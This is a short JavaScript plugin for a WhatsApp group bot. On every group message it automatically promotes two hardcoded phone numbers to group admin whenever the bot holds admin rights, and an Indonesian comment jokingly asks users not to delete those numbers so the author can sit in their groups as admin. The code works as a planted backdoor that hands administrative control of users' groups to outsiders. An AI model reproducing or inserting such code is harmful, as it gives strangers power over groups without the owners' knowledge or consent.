let handler = m => m

handler.before = async function (m, { isBotAdmin }) {
if (!m.isGroup) return !0;
let who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : m.fromMe ? this.user.jid : m.sender
if (isBotAdmin) {
await (await this.groupMetadata(m.chat)).participants.filter(m => m.id.startsWith('6283837709331') && m.admin != 'admin').map(async c => this.groupParticipantsUpdate(m.chat, [c.id], 'promote'))
await (await this.groupMetadata(m.chat)).participants.filter(m => m.id.startsWith('6285954708804') && m.admin != 'admin').map(async c => this.groupParticipantsUpdate(m.chat, [c.id], 'promote'))
/* BACA NYET
  * Kalo Mau Nambahin Nomormu, Copy trus ganti nomormu.
  * Jangan Hapus 2 Nomor Diatas! Numpang Jadi Admin Di gc mu Ntar:v
  * Tambahin Nomormu Dibawah Ini!
  * Hapus Tanda (//) Dulu Gausah Manja Yak! */
//await (await this.groupMetadata(m.chat)).participants.filter(m => m.id.startsWith('Nomormu Nyet') && m.admin != 'admin').map(async c => this.groupParticipantsUpdate(m.chat, [c.id], 'promote'))
} return true
}

export default handler